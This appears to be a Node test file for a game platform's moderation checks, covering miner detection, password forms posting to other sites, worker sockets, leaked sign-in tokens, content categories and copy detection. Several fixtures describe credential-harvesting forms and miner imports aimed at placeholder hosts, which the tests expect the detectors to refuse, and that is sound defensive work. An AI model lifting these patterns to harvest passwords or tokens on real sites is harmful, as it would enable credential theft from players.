// Rule-level tests of the publishing gates added by the moderation audit (the full corpus run is tests/moderation/audit.mjs).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { conductRules, contentCheck, contentRules, credentialForms } from '../src/content-check.js';
import { pixelChange } from '../src/verify-core.js';
import { bundlePrints, compare, containment } from '../src/originality.js';

const carrier = { path: 'game.js', text: readFileSync(new URL('./moderation/carrier.js', import.meta.url), 'utf8') };

test('an ordinary game passes the conduct rules', () => {
  assert.equal(conductRules({ texts: [carrier], report: { conduct: {} } }).reason, null);
});

test('miner signatures are refused', () => {
  const r = conductRules({ texts: [carrier, { path: 'w.js', text: 'importScripts("cryptonight.js")' }] });
  assert.match(r.reason, /miner/);
});

test('a password posted to another site is refused, a password puzzle is not', () => {
  const form = '<form action="https://collect.example.invalid/x"><input type="password"></form>';
  assert.equal(credentialForms([{ path: 'index.html', text: form }]).length, 1);
  assert.match(conductRules({ texts: [{ path: 'index.html', text: form }] }).reason, /password/);
  const puzzle = '<input type="password" id="code"><script>if (code.value === "1234") open()</script>';
  assert.equal(conductRules({ texts: [{ path: 'index.html', text: puzzle }] }).reason, null);
});

test('a worker with a socket to another server is refused; sends alone are only notes', () => {
  const ws = { external: [{ type: 'websocket', host: 'relay.example.invalid' }], workers: 1 };
  assert.match(conductRules({ report: { conduct: ws } }).reason, /background worker/);
  const r = conductRules({ report: { conduct: { external: [{ type: 'fetch', method: 'POST', host: 'api.example.invalid' }] } } });
  assert.equal(r.reason, null);
  assert.equal(r.notes.length, 1);
});

test('fallback content rules: clear words only', () => {
  assert.equal(contentRules('Zombie Siege: shoot the undead, blood everywhere'), null);
  assert.equal(contentRules('A dark horror escape room'), null);
  assert.equal(contentRules('Sex chat game')?.category, 'sexual');
  assert.equal(contentRules('Send 0.1 BTC and get 0.2 back')?.category, 'scam');
});

test('content check: the AI verdict decides above the threshold, rules when AI is off', async () => {
  const listing = { title: 'Rock Dodger', tags: ['arcade'] };
  const ai = (p) => async () => ({ verdict: { type: 'choice', choice: 'x', probabilities: p } });
  assert.equal((await contentCheck({ listing, ai: ai({ fine: 0.9, hate: 0.1 }) })).ok, true);
  const bad = await contentCheck({ listing, ai: ai({ fine: 0.2, hate: 0.8 }) });
  assert.equal(bad.ok, false); assert.equal(bad.category, 'hate'); assert.equal(bad.by, 'ai');
  assert.equal((await contentCheck({ listing, ai: async () => null })).ok, true);
  assert.equal((await contentCheck({ listing: { title: 'nsfw pics' }, ai: null })).category, 'sexual');
});

test('pixel change counts only real differences', () => {
  const img = (v) => ({ w: 20, h: 20, bpp: 3, stride: 60, px: new Uint8Array(1200).fill(v) });
  assert.equal(pixelChange(img(10), img(20)), 0);
  assert.equal(pixelChange(img(10), img(200)), 1);
  assert.equal(pixelChange(img(10), null), 0);
});

test('a minified copy keeps most of its fingerprints', async () => {
  const esbuild = await import('esbuild');
  const src = readFileSync(new URL('../web/public/templates/canvas2d-arcade/src/main.js', import.meta.url), 'utf8');
  const min = esbuild.transformSync(src, { minify: true, loader: 'js' }).code;
  const a = bundlePrints([{ path: 'a.js', text: min }]), b = bundlePrints([{ path: 'b.js', text: src }]);
  assert.ok(containment(a, b) > 0.4, String(containment(a, b)));
});

test('sending the player token to another site is refused', () => {
  assert.match(conductRules({ report: { conduct: { tokenSent: 'collect.example.invalid' } } }).reason, /sign-in token/);
});

test('a small game copied whole is a copy, a small shared helper is not', () => {
  const src = readFileSync(new URL('./moderation/corpus/g-memory/index.html', import.meta.url), 'utf8');
  const P = (t) => ({ prints: bundlePrints([{ path: 'index.html', text: t }]), files: [], assets: [], look: null });
  assert.equal(compare(P(src.replace(/\bdeck\b/g, 'pile')), P(src)).verdict, 'copy');
});
